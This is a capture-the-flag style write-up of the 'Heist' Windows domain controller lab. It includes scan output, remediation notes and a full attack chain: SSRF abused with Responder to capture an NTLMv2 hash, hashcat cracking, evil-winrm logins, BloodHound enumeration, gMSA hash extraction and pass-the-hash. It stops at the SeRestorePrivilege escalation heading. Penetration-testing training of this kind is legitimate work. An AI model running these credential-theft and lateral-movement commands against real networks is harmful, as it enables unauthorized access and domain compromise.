---
Alias: Heist
Date: 9/9/2022
Platform: Windows
Difficulty: Hard
Tags: #SSRFvulnerability #responder #evil-winrm  #Winrmshell #Windowsuserenumeration #neo4jconsole #bloodhound #ADservicecanreadGMSApassword #GMSA #GroupManagedServiceAccount #rc4_hmac #SeRestorePrivilegeEnabledPrivelegeEscalation

Status: Finished
IP: 192.168.231.165 
---

# {{Heist}}


# Resolution summary
- Located a webpage on port 8080 which is vulnerable to SSRF
- Utilized Responder to exploit the SSRF vulnerability; retrieve username and NTLMv2 hashed password
- Cracked hashed password utilizing hashcat
- Utilized  evil-winrm to login to a session with the retrieved users credentials
- Retrieved all computers, domains, grops and user information in json format utilizing bloodhound-python
- Found scv_apache account can read the GMSA password utilizing bloodhound
- Utilized GMSAPasswordReader.exe to read svc_apache's NTML hash
- Utilized user svc_apache and NTLM has to login to an evil-winrm session
- Found SeRestorePrivilege is enabled and followed privilege escalation steps 
- Then received a cmd session as NT authority/system

## Improved skills
- Active Directory enumeration
- Bloodhound tool enumeration
- crackmapexec enumeration

## Used tools
- nmap
- rustscan
- rdesktop
- Responder
- Bloodhound
- Neo4j console
- Crackmapexec
- evil-winrm
- GMSAPasswordReader.exe
- hashcat
- bloodhound-python

### **Vulnerability Explanation:** 
### Initial Access
#### Server-Side Request Forgery (SSRF) leading to retreiving an NTLMv2 hash through Responder

Title: NTLM Hash Retrieval via SSRF and Responder Tool

Type of Vulnerability: OWASP Top 10 - A3:2021 - Injection

CWE Reference: CWE-918: Server-Side Request Forgery (SSRF)

Proposed CVSS Score: 9.1 (Critical)

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
Rationale: This vulnerability scores higher due to the nature of the attack which potentially compromises sensitive data (NTLM hashes) that could be used to escalate privileges or execute further attacks. The attack vector is network-based, does not require user interaction, and has a low attack complexity.
Generic Description:

Server-Side Request Forgery (SSRF) is an exploit where an attacker abuses the functionality of a server causing it to access or manipulate information at the attacker’s behest. A common exploitation scenario involves the server making network requests to unintended locations. Responder is a network tool that listens for network traffic and responds to protocols like LLMNR, NBT-NS, and MDNS, where it can masquerade as legitimate services to capture NTLM hashes from systems that try to authenticate.

When combined with SSRF, an attacker can manipulate a server to send internal network requests that Responder captures, thereby obtaining NTLM hashes which are valuable for further attacks, such as pass-the-hash or brute force decryption.

Specific Description:

In this specific scenario, an attacker utilizes SSRF to force the server to send a request to a maliciously controlled domain or IP where the Responder tool is waiting. For example, the server, through SSRF vulnerability, might be tricked into requesting a file from \\attacker-controlled-server\file. Responder, running on the attacker-controlled server, will then capture the NTLM hash of the account under which the server’s request is executed. This hash can then be cracked offline or used in pass-the-hash attacks to gain unauthorized access.



### **Vulnerability Fix:** 
### Initial Access
#### Server-Side Request Forgery (SSRF) leading to retreiving an NTLMv2 hash through Responder

1. **Validate and Sanitize Input:** Ensure strict validation and sanitization of all user inputs that are used to construct URLs or network requests. Only allow URLs that are absolutely necessary and validate them against a strict allowlist.
2. **Disable Unnecessary Protocols:** Disable legacy protocols such as LLMNR, NBT-NS, and others on network devices if they are not needed, as these are commonly exploited by tools like Responder.
3. **Network Segmentation and Firewall Rules:** Use network segmentation and strict firewall rules to control outbound network traffic from servers to prevent them from accessing potentially malicious external locations.
4. **Use HTTPS Exclusively:** Force the use of HTTPS for all outbound connections which can prevent the transmission of NTLM hashes over the network.
5. **Patch and Update Systems:** Regularly update and patch systems to mitigate known vulnerabilities and disable insecure protocols and services.
6. **Regular Security Audits and Monitoring:** Conduct regular security audits to identify and mitigate SSRF vulnerabilities. Implement monitoring to detect unusual network requests or unexpected use of network protocols.
7. **Educate and Train Staff:** Provide training for developers and network administrators on the risks associated with SSRF and the importance of securing network services.

Implementing these remediation steps can greatly reduce the risk of NTLM hash theft via SSRF and Responder, protecting sensitive data and internal network resources from unauthorized access and potential compromise.

### **Vulnerability Explanation:** 
#### Lateral Movement
##### Read GMSA Password

#### Title: Unauthorized Access to Group Managed Service Account (gMSA) Password

#### Type of Vulnerability: OWASP Top 10 - A5:2021 - Security Misconfiguration

#### CWE Reference: CWE-200: Information Exposure

#### Proposed CVSS Score: 7.4 (High)

- **Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **Rationale:** This vulnerability is network exploitable with a low attack complexity, requiring low privileges for exploitation, and no user interaction. The primary impact is on confidentiality, as exposure of a gMSA password could allow attackers to access services and data authorized to the gMSA, potentially leading to broader attacks within an environment.

#### Generic Description:

Group Managed Service Accounts (gMSAs) are used in Windows environments to manage services and tasks across multiple servers without the need for manual password management. The gMSA automatically handles password management, changing the passwords without user intervention. If an attacker gains unauthorized access to read a gMSA password, they can impersonate the gMSA to access any system or service that the gMSA has permissions to access. This vulnerability typically results from improper permission settings or security misconfigurations.

#### Specific Description:

In this vulnerability scenario, the permissions set on the gMSA are too permissive, allowing low-privileged domain users to read the gMSA password via Windows PowerShell commands or other methods. This issue might arise due to an oversight during configuration or a misunderstanding of the necessary permission levels. For example, a common mistake is granting 'Authenticated Users' group more permissions than needed on the gMSA object, which includes the ability to read properties that should be restricted to highly privileged accounts.


### **Vulnerability Fix:** 
#### Lateral Movement
##### Read GMSA Password

1. **Review and Restrict Permissions:** Examine and tighten permissions on the gMSA objects. Ensure that only necessary accounts and groups (typically domain admins or specific service accounts) have the 'Read' permission on sensitive attributes like the gMSA password.
2. **Use Role-Based Access Control (RBAC):** Implement RBAC to manage access control effectively, ensuring that only roles with a legitimate need have access to manage or read gMSA passwords.
3. **Audit and Monitor Access:** Regularly audit permissions on gMSAs and monitor access logs to detect and respond to unauthorized attempts to access sensitive information.
4. **Educate Administrators:** Train system administrators on the correct setup and management of gMSAs, emphasizing the security risks associated with improper permission configurations.
5. **Automated Configuration Management:** Use configuration management tools to apply and enforce security policies automatically, preventing misconfigurations.
6. **Periodic Security Assessments:** Regularly perform security assessments to identify and mitigate misconfigurations or vulnerabilities associated with gMSAs and other identity management components.

By addressing these aspects, organizations can secure gMSA usage against unauthorized access and reduce the risk of attackers exploiting these credentials to gain further access within the network.


### **Vulnerability Explanation:** 
#### Privilege Escalation
###### SeRestorePrivilege

#### Title: Privilege Escalation via Misuse of SeRestorePrivilege

#### Type of Vulnerability: OWASP Top 10 - A5:2021 - Security Misconfiguration

#### CWE Reference: CWE-269: Improper Privilege Management

#### Proposed CVSS Score: 8.4 (High)

- **Vector:** CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
- **Rationale:** This score reflects the local exploitation requirement with low attack complexity, low-level privileges needed, and no user interaction. The vulnerability can lead to complete compromise of system integrity, confidentiality, and availability through unauthorized actions.

#### Generic Description:

The `SeRestorePrivilege` is a Windows security privilege that allows a user to set any valid user or group Security Identifier (SID) as the owner of an object, restore files to directories, and set file permissions, bypassing standard file and directory permission constraints. This privilege is intended for use in system recovery scenarios. However, if misused or granted inappropriately, it can be exploited by an attacker or malicious software to escalate privileges, overwrite system files, or change permissions on critical system files to gain further access.

#### Specific Description:

In a typical exploitation scenario, an attacker with control over an account that has been granted `SeRestorePrivilege` (but otherwise has limited permissions) can overwrite system files, replace executable files with malicious versions, or modify permissions to grant themselves more extensive access. For example, the attacker could replace a system utility or service executable with a malicious one that grants them administrative privileges the next time it is executed. This privilege can also be abused to alter logs and security-related files, facilitating undetected persistence on the host.

### **Vulnerability Fix:** 
#### Privilege Escalation
###### SeRestorePrivilege

1. **Review and Restrict Privileges:** Carefully review which accounts are granted `SeRestorePrivilege` and ensure it is only assigned to accounts where absolutely necessary. Remove this privilege from accounts that do not require it for their day-to-day or even backup-related operations.
2. **Least Privilege Principle:** Enforce the principle of least privilege by ensuring that users and accounts only have the privileges essential for their roles and responsibilities.
3. **Use of Security Policies:** Implement and enforce security policies that govern the assignment and use of advanced privileges. Use tools like Group Policy Objects (GPOs) to manage these settings across the organization effectively.
4. **Monitor and Audit:** Use security monitoring tools to track the use of sensitive privileges like `SeRestorePrivilege`. Implement auditing on the use of these privileges and review the logs regularly to detect any misuse or unusual activities.
5. **Educate Administrators and Users:** Provide training for system administrators on the risks associated with high-level privileges and the importance of securing them.
6. **Segregation of Duties:** Separate duties in a way that prevents any single account from having the ability to both backup and restore data unless specifically part of an authorized and closely monitored process.

By implementing these remediation steps, organizations can reduce the risk of privilege escalation through the misuse of `SeRestorePrivilege` and ensure that their systems are protected against unauthorized changes and potential security breaches.




---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.231.165 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.231.165:53
Open 192.168.231.165:88
Open 192.168.231.165:135
Open 192.168.231.165:139
Open 192.168.231.165:389
Open 192.168.231.165:445
Open 192.168.231.165:464
Open 192.168.231.165:593
Open 192.168.231.165:636
Open 192.168.231.165:3268
Open 192.168.231.165:3269
Open 192.168.231.165:3389
Open 192.168.231.165:5985
Open 192.168.231.165:8080
Open 192.168.231.165:9389
Open 192.168.231.165:49666
Open 192.168.231.165:49669
Open 192.168.231.165:49668
Open 192.168.231.165:49670
Open 192.168.231.165:49672
Open 192.168.231.165:49689
Open 192.168.231.165:49716
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.231.165
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 20:18 PDT
Happy 25th Birthday to Nmap, may it live to be 125!
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:18
Completed Parallel DNS resolution of 1 host. at 20:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:18
Scanning 192.168.231.165 [22 ports]
Discovered open port 135/tcp on 192.168.231.165
Discovered open port 139/tcp on 192.168.231.165
Connect Scan Timing: About 11.36% done; ETC: 20:25 (0:05:51 remaining)
Discovered open port 8080/tcp on 192.168.231.165
Discovered open port 53/tcp on 192.168.231.165
Connect Scan Timing: About 20.45% done; ETC: 20:24 (0:04:52 remaining)
Discovered open port 3389/tcp on 192.168.231.165
Discovered open port 445/tcp on 192.168.231.165
Connect Scan Timing: About 29.55% done; ETC: 20:24 (0:04:10 remaining)
Discovered open port 49669/tcp on 192.168.231.165
Discovered open port 49716/tcp on 192.168.231.165
Connect Scan Timing: About 38.64% done; ETC: 20:24 (0:03:34 remaining)
Discovered open port 593/tcp on 192.168.231.165
Discovered open port 88/tcp on 192.168.231.165
Discovered open port 49672/tcp on 192.168.231.165
Connect Scan Timing: About 52.27% done; ETC: 20:24 (0:02:58 remaining)
Discovered open port 3268/tcp on 192.168.231.165
Discovered open port 5985/tcp on 192.168.231.165
Connect Scan Timing: About 61.36% done; ETC: 20:24 (0:02:22 remaining)
Discovered open port 49670/tcp on 192.168.231.165
Discovered open port 49689/tcp on 192.168.231.165
Connect Scan Timing: About 70.45% done; ETC: 20:24 (0:01:47 remaining)
Discovered open port 9389/tcp on 192.168.231.165
Discovered open port 636/tcp on 192.168.231.165
Connect Scan Timing: About 79.55% done; ETC: 20:24 (0:01:13 remaining)
Discovered open port 49668/tcp on 192.168.231.165
Discovered open port 389/tcp on 192.168.231.165
Connect Scan Timing: About 88.64% done; ETC: 20:24 (0:00:40 remaining)
Discovered open port 464/tcp on 192.168.231.165
Discovered open port 3269/tcp on 192.168.231.165
Discovered open port 49666/tcp on 192.168.231.165
Completed Connect Scan at 20:24, 360.18s elapsed (22 total ports)
Initiating Service scan at 20:24
Scanning 22 services on 192.168.231.165
Service scan Timing: About 22.73% done; ETC: 20:26 (0:01:49 remaining)
Service scan Timing: About 31.82% done; ETC: 20:27 (0:02:13 remaining)
Service scan Timing: About 68.18% done; ETC: 20:26 (0:00:45 remaining)
Service scan Timing: About 72.73% done; ETC: 20:27 (0:00:57 remaining)
Service scan Timing: About 81.82% done; ETC: 20:29 (0:00:59 remaining)
Service scan Timing: About 90.91% done; ETC: 20:30 (0:00:32 remaining)
Completed Service scan at 20:31, 433.82s elapsed (22 services on 1 host)
NSE: Script scanning 192.168.231.165.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:31
NSE Timing: About 98.13% done; ETC: 20:32 (0:00:01 remaining)
NSE Timing: About 99.23% done; ETC: 20:32 (0:00:00 remaining)
Completed NSE at 20:32, 76.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:33, 5.90s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
Nmap scan report for 192.168.231.165
Host is up, received user-set (0.16s latency).
Scanned at 2022-09-01 20:18:42 PDT for 861s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-09-02 03:24:40Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-02T03:32:54+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Issuer: commonName=DC01.heist.offsec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-17T22:04:25
| Not valid after:  2023-01-16T22:04:25
| MD5:   73c5 30c0 df09 668f d701 ff17 6129 0493
| SHA-1: 74b0 f22f 5449 5d47 b100 4ffe 266d c51c 8d9b 2d5d
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQbNn2IUrUjY9PdO2Odd610zANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFEQzAxLmhlaXN0Lm9mZnNlYzAeFw0yMjA3MTcyMjA0MjVaFw0y
| MzAxMTYyMjA0MjVaMBwxGjAYBgNVBAMTEURDMDEuaGVpc3Qub2Zmc2VjMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvFxcdBIGl7TjIoHZGdLV9Kzu+4o4
| e/p2hQj8A8ES3sVFiWDjJRQtGueQIYjIe6iUjAvwURU/okUe1DGUTKpelabApuVi
| kbQnnlGxOXdisdfqt+p5spSeq4/qB5B/OCC+/5ZgtARhtUTKoDP8WECwMrORQr8x
| nqQlpDdus7SXsJrDhv2f29YCDsN0oyd0f6x1LUuJE1glGb/nBJcYtU+npaYJbe7W
| 1FD/i5LUR3tS1D89Fa9jjjoCdo5Zknb+vdXiMGPlsIgBVoNqVdd6gqmO6bIX0J/I
| PL2txQKwcuK7p+9jFc+G6sbHQHyGUyx4T0GP2lCRvosXVNA/v/1Miuu59QIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAF+bP5Z/SwmiKeDOmwTXIBHPY5cvhDQCSsLXkSYSlrPB4X2KggaK
| IA473Gnx8X0mm3OR/GN6u4a8OrgEKOhA4IFkv2GWE03zX5OIFy5o/mEtFeOMvfOc
| 0XgLjzBFp15r54UqrT+ZlDTx4ktcdy6Or7pqStwp/OZkVz8JSRXXMDG9t6bRWcA/
| 0pGkPcxYoMr35RSjsh/TkQaySnORugXbggeyWm+yv3EGQEyXQpB/84jl64+WnQCW
| ZG44P4PfAWOxeDlaoY46thr/9OZuPU9FBERGzyrK1zlz8yTUEVvRzHqtkVuJ//IE
| ulwyR0DC8nLrOAqTOXttifFW8fsf6qFRnjQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-09-02T03:33:01+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          syn-ack Werkzeug httpd 2.0.1 (Python 3.9.0)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-02T03:32:40
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56666/tcp): CLEAN (Timeout)
|   Check 2 (port 39499/tcp): CLEAN (Timeout)
|   Check 3 (port 11903/udp): CLEAN (Timeout)
|   Check 4 (port 7767/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 876.72 seconds







nmap -sC -sV -p 53,88,135,139,445,464,593,636,3268,3269,3389,5985,8080,9389,49666,49669,49668,49670,49672,49689,49716 192.168.231.165 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 20:26 PDT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 61.90% done; ETC: 20:27 (0:00:08 remaining)
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 20:27 (0:00:06 remaining)
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 20:27 (0:00:08 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 20:27 (0:00:11 remaining)
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 20:27 (0:00:18 remaining)
Nmap scan report for 192.168.231.165
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-02 03:26:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-09-02T03:28:18+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-02T03:27:40+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2022-07-17T22:04:25
|_Not valid after:  2023-01-16T22:04:25
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-02T03:27:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.06 seconds
```

Enumerated open TCP ports:
```bash
8080
5985
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8080

- We click the search icon after entering the following in the "Enter URL" bar.

http://[Kali IP]:445

![](Images/Pasted%20image%2020221012174609.png)


- On our Kali machine, we enter "updog -p 445" to launch an HTTP server.
  
- We click the search icon after entering the following in the "Enter URL" bar.

http://[Kali IP]:445

![](Images/Pasted%20image%2020221012174728.png)

- We can access our HTTP server. This confirmed an SSRF vulnerability
  
![](Images/Pasted%20image%2020221012174847.png)
![](Images/Pasted%20image%2020221012180025.png)
#SSRFvulnerability

We notice that the URL would navigate to the file but it would not execute the file. This gave us an idea that we might be able to use Responder to exploit the SSRF vulnerability and intercept authorization credentials.

- The following webpage appears when we click the utils.py file on our web server.
  
![](Images/Pasted%20image%2020221012181158.png)

- We add the filename to the initial search, however, causes it to read the file we choose but not to execute it.
  
![](Images/Pasted%20image%2020221012181305.png)

![](Images/Pasted%20image%2020221012181352.png)

- An attacker may occasionally be able to cause the server to connect to random external systems by exploiting an SSRF vulnerability. This could expose private information, including login passwords.

- Responder is a specialized tool that can be used to intercept authorization credentials when a system is connected arbitrarily.

- With this data, we should be able to configure Responder to generate a fake WPAD proxy server and use the web server's URL search bar to look up any domain. Once the request is sent, the responder should intercept it and release the user's hash for the web server.

---

# Exploitation
### SSRF Leading To Retreiving Username And NTLMv2 Hash Through Responder

We set up Responder on our machine with the following command: "responder -I tun0 -wv". We then send a request to our IP on a port that is not open, which results in a NetNTLMv2 hashed password for the user "enox" being dumped into the Responder output. We crack the hashed password utilizing hashcat, which reveals the password "california".

-The following command is used to launch Responder:

responder -I tun0 -wv

#responder

- We forward a request to our Kali IP on port 80, which did not show as open in our previous rustscan.
  
![](Images/Pasted%20image%2020221012181516.png)

- After sending the request, our Responder response contains an NTLMv2 hash for the user enox.
  
![](Images/Pasted%20image%2020221012181626.png)

- Using vim we copy the whole hash, including the username, into a file called hash.txt. Next, we crack this hash type by using the following command to determine the required cracking mode:
  
hashcat -h | grep -i "ntlmv2"
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

- The hash is cracked in a matter of moments and the password is saved in the "cracked.txt" file.
  
- We examine the "cracked.txt" file, revealing the password California and the username enox.

We then use crackmapexec to establish a remote session with the user enox. We run the command "crackmapexec winrm <target_IP> -d heist.offsec -u enox -p california -x "whoami"" and discover that the user "heist/enox" is running on the target machine. We then establish a winrm shell using the command "evil-winrm -i <target_IP> -u enox -p california".

- We type the following command and discover that the target machine is being used by user “heist/enox”:

crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x “whoami”

![](Images/Pasted%20image%2020221012181836.png)


- We receive the following winrm shell when we typed "evil-winrm -i 192.168.123.165 -u enox -p california":
  
![](Images/Pasted%20image%2020221012212318.png)
#evil-winrm  #Winrmshell


---

# Lateral Movement to user
## Local Enumeration

- We type "net user enox" and observe that the current user "enox" belongs to the "Web Admins" group.
  
![](Images/Pasted%20image%2020221012182010.png)
#Windowsuserenumeration

- We use PowerUp.ps1 and other privilege escalation scripts in an attempt to list Privilege Escalation vectors, but nothing is discovered.
  
- On our Kali machine, we type "sudo neo4j console" and enter our neo4j credentials to log into the console.
#neo4jconsole

- On our Kali machine, we open a another terminal, type "bloodhound," and log on to bloodhound.
#bloodhound

- We open a new terminal and enter the below command. This retrieves the machines, domains, groups and users information in .json format from the target machine:

bloodhound-python -u enox -p california -ns 192.168.81.165 -d heist.offsec -c all

![](Images/Pasted%20image%2020221012213928.png)
![](Images/Pasted%20image%2020221012214003.png)

- We click "upload data" after navigating to Bloodhound. Choose every .json file and press open. Information about the target machine's active directory was uploaded to Bloodhound.
  
- To view a list of pre-built queries, we click the hamburger icon in Bloodhound's upper left corner, and then select the "Analysis" option.
  
![](Images/Pasted%20image%2020221012214126.png)

- As we worked our way up the list, nothing was giving us any information until we found Shortest Paths to High Value Targets. There, we learned nothing new about our current user, but we did learn some intriguing details about the service account.
  
![](Images/Pasted%20image%2020221012214301.png)
#ADservicecanreadGMSApassword #GMSA #GroupManagedServiceAccount

- This indicates that the svc_apache service account is a Group Managed Service Account (gMSA) since it can see the GMSA password.
#GMSApassword

- It can be verified that this account is a service account with GMSA enabled by running the following PowerShell command:

Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

![](Images/Pasted%20image%2020221012214423.png)

- We upload PowerView.ps1 to the target machine.

- We type the following command to load PowerView.ps1 onto the target machine.

. .\PowerView.ps1

- We type the following command to find info about which groups have permissions to retrieve the password for the svc_apache service account.
  
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,PrincipalsAllowedToRetrieveManagedPassword

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/b10215d2-a249-455d-8c33-5b6c130cdbec)

- This shows that the gMSA password may be retrieved by Web Admins group members. It was during the manual enumeration earlier that we discovered our current user **enox** belonged to this group.

- Additionally, this demonstrates that the svc_apache account is a member of the remote users group. This implies that we may use evil-winrm to remotely log in with this account once we have extracted the gMSA password.

- We run the following command to confirm if our user is a member of the Web Admins group just to be sure.
  
Get-ADGroupMember 'Web Admins'

![](Images/Pasted%20image%2020221012214545.png)


## Lateral Movement vector

- To extract the NTLM hash from the active directory, we search for "gMSA password extraction tool github" on Google and discover the following tool.
  
![](Images/Pasted%20image%2020221012215446.png)

![](Images/Pasted%20image%2020221012215548.png)

- We download the precompiled binary GMSAPasswordReader.exe to the target machine.
  
- We type the following command and receive the NTLM hash (the rc4_hmac is the same as the NTLM hash).

.\GMSAPasswordReader.exe -- AccountName 'svc_apache'

![](Images/Pasted%20image%2020221012215649.png)
#GMSApasswordReader.exe
#rc4_hmac

- A winrm login session as user svc_apache$ was acquired when we type the following command.

evil-winrm -i 192.168.81.165 -u svc_apache$ -H 4283B392D3647F3F26D614EE3AB9A80C

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/3d000ba6-198f-478a-ac41-6c88c1f5b3a1)

---

# Privilege Escalation
## Local Enumeration

After gaining access to the svc_apache account, we discovered that the SeRestorePrivilege was enabled. We followed the privilege escalation steps, which involved creating a new service and running a command to get a cmd session as NT Authority\System.


- We discover that SeRestorePrivilege is enabled when we type the following command.

whoami /priv

![](Images/Pasted%20image%2020221012220215.png)
#SeRestorePrivilegeEnabledPrivelegeEscalation

- We search for "SeRestorePrivilege privilege escalation" on Google and discover the Hacktricks page that outlines the steps to take.
  
![](Images/Pasted%20image%2020221012220333.png)


## Privilege Escalation Vector
#### SeRestorePrivilege 

